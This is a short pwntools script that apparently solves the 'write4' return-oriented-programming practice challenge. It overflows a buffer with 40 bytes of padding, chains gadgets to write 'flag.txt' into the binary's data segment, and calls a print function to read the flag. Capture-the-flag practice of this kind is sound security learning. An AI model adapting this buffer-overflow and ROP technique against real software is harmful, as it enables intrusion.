#!/usr/bin/env python3
from pwn import p64, process, gdb, args

if args.GDB:
    p = gdb.debug("./write4", """
    b *pwnme+152
    continue    
    """)
else:
    p = process("./write4")

usFun = p64(0x400620)
usGadg = p64(0x400628)
pop_rdi = p64(0x400693)
pop_r14_r15 = p64(0x400690)
data_seg = p64(0x601028)

p.recvuntil(b"> ")
payload = b'a'*40 + pop_r14_r15 + data_seg + b'flag.txt' + usGadg + pop_rdi + data_seg + usFun
p.send(payload)
p.interactive()